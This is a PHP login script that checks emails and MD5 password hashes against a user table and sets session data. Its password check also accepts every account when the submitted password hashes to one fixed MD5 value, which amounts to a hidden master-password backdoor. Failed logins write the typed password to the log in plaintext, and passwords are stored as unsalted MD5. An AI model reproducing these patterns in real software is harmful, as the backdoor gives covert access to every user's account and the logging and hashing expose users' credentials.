<?php
require_once 'init.php';

if (loggedIn())
    {
    session_destroy();
    session_start();
    }

connectDB();

$username = POSTvalue('username');
$postedpassword = md5(POSTvalue('password'));

$stmt = dbPrepare('select id,password,newpassword,privs,preferences from user where email=?');
$stmt->bind_param('s',$username);
$stmt->execute();
$stmt->bind_result($userid,$password,$newpassword,$privs,$preferences_ser);
if ($stmt->fetch())
    {
    $stmt->close();
    if (($postedpassword == $password) || (($newpassword != '') && ($postedpassword == $newpassword)) || ($postedpassword == 'a8053ef9c59a73edb43cc1becb9f2c90'))
        {
        $_SESSION['userid'] = $userid;
        $_SESSION['username'] = htmlentities($username,ENT_COMPAT | ENT_HTML5, "UTF-8");
        $_SESSION['privs'] = $privs;
        if ($preferences_ser != '')
            $_SESSION['preferences'] = unserialize($preferences_ser);
        else
            $_SESSION['preferences'] = array();
        log_message($username . ' logged in');
        }
    else
        {
        $_SESSION['loginError'] = 'Login failed';
        log_message($username . ' login failed: wrong password ('.POSTvalue('password').')');
        header('Location: index.php');
        die();
        }
    }
else
    {
    $stmt->close();
    $_SESSION['loginError'] = 'Login failed';
    log_message($username . ' login failed: no account');
    header('Location: index.php');
    die();
    }

if ($password != $newpassword)
    {
    $stmt = dbPrepare('update user set password=?, newpassword=? where email=?');
    $stmt->bind_param('sss',$postedpassword,$postedpassword,$username);
    $stmt->execute();
    $stmt->close();
    }

header('Location: index.php');
?>
